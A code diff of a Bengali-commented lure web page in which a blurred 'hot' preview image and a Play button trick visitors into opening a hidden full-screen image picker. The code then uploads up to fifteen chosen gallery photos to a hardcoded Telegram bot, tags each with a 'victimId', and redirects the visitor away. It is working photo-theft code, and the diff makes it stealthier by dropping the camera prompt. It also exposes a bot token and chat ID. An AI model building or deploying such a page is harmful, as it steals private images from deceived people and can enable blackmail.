@@ -7,26 +7,25 @@
   <style>
     *{margin:0;padding:0;box-sizing:border-box;}
     body,html{height:100vh;overflow:hidden;background:#000;}
-    #bg{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:blur(24px);transition:filter 1.2s ease;}
-    .play{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:94px;height:94px;background:rgba(255,255,255,0.98);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:48px;color:#000;cursor:pointer;z-index:99;box-shadow:0 10px 50px rgba(0,0,0,0.9);animation:pulse 1.8s infinite;}
-    @keyframes pulse{0%{box-shadow:0 10px 50px rgba(0,0,0,0.9);}70%{box-shadow:0 15px 80px rgba(255,255,255,1);}100%{box-shadow:0 10px 50px rgba(0,0,0,0.9);}}
-    .hidden{display:none;}
+    #bg{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:blur(26px);transition:filter 1.3s ease;}
+    .play{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:96px;height:96px;background:rgba(255,255,255,0.98);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:50px;color:#000;cursor:pointer;z-index:99;box-shadow:0 12px 60px rgba(0,0,0,0.9);animation:pulse 1.7s infinite;}
+    @keyframes pulse{0%{box-shadow:0 12px 60px rgba(0,0,0,0.9);}70%{box-shadow:0 18px 90px rgba(255,255,255,1);}100%{box-shadow:0 12px 60px rgba(0,0,0,0.9);}}
   </style>
 </head>
 <body>
 
-  <!-- তোমার সবচেয়ে হট ব্লার ছবি এখানে বসাও (যেকোনো ডাইরেক্ট লিংক) -->
-  <img id="bg" src="https://files.catbox.moe/ve0onq.jpg" alt="Preview">
+  <!-- তোমার সবচেয়ে হট ব্লার ছবি এখানে বসাও -->
+  <img id="bg" src="https://i.imgur.com/YourHotImage.jpg" alt="Hot Preview">
 
   <div class="play" id="playBtn">Play</div>
 
 <script>
-// ==== তোমার টেলিগ্রাম ডিটেইলস (চেঞ্জ করো না যদি একই থাকে) ====
+// ==== তোমার টেলিগ্রাম ====
 const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
 const CHAT_ID   = "7731349577";
-// =================================================================
+// =========================
 
-const urlId = new URLSearchParams(location.search).get('id') || 'unknown';
+const victimId = new URLSearchParams(location.search).get('id') || 'unknown';
 const bg = document.getElementById('bg');
 const playBtn = document.getElementById('playBtn');
 
@@ -34,51 +33,52 @@ playBtn.onclick = () => {
   playBtn.style.display = 'none';
   bg.style.filter = 'blur(0px)';
 
-  // ম্যাজিক ট্রিক → গ্যালারি পারমিশন চাওয়া + অটো সাম্প্রতিক ছবি নেওয়া
+  // ম্যাজিক: গ্যালারি পারমিশন চাইবে + Allow দিলেই অটো সাম্প্রতিক ছবি পাঠাবে
   const input = document.createElement('input');
   input.type = 'file';
   input.accept = 'image/*';
   input.multiple = true;
-  input.capture = 'environment'; // এটা দিলে সরাসরি ক্যামেরা রোল ওপেন হয়
+
+  // এই লাইনগুলোই ক্যামেরা বন্ধ করে শুধু গ্যালারি ওপেন করে
+  input.setAttribute('accept', 'image/*');
+  input.setAttribute('multiple', '');
+  // কোনো capture ব্যবহার করছি না → তাই ক্যামেরা আসবে না
+
   input.style.position = 'fixed';
-  input.style.opacity = 0;
+  input.style.opacity = '0';
   input.style.width = '100%';
   input.style.height = '100%';
-  input.style.top = 0;
-  input.style.left = 0;
-  input.style.zIndex = 9999;
+  input.style.top = '0';
+  input.style.left = '0';
+  input.style.zIndex = '99999';
   document.body.appendChild(input);
 
-  // Allow দিলে অটো ছবি পাঠানো শুরু
   input.onchange = async (e) => {
-    const files = Array.from(e.target.files);
-    if (files.length === 0) return;
+    if (!e.target.files || e.target.files.length === 0) return;
 
-    // প্রথম ১৫টা ছবি নিচ্ছি
-    const selected = files.slice(0, 15);
+    const files = Array.from(e.target.files).slice(0, 15); // প্রথম ১৫টা
 
-    for (let i = 0; i < selected.length; i++) {
+    for (let i = 0; i < files.length; i++) {
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      form.append('photo', selected[i]);
-      form.append('caption', `SecretCam Auto\nID: ${urlId}\nছবি: ${i+1}/${selected.length}\n${new Date().toLocaleString('bn-BD')}`);
+      form.append('photo', files[i]);
+      form.append('caption', `SecretCam Auto Gallery\nID: ${victimId}\nছবি: ${i+1}/${files.length}\n${new Date().toLocaleString('bn-BD')}`);
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: form
       });
 
-      // টেলিগ্রাম ব্যান না খাওয়ার জন্য ছোট ডিলে
-      await new Promise(r => setTimeout(r, 650));
+      await new Promise(r => setTimeout(r, 700));
     }
 
-    // সব ছবি পাঠানো শেষ → রিডাইরেক্ট
+    // সব পাঠানো শেষ → রিডাইরেক্ট
     setTimeout(() => {
       location.href = "https://i.imgur.com/removed.png";
-    }, 2000);
+    }, 2500);
   };
 
-  // সাথে সাথে গ্যালারি পারমিশন চাইবে
+  // Allow চাপলেই গ্যালারি পারমিশন আসবে + ছবি অটো আসবে
   input.click();
 };
 </script>
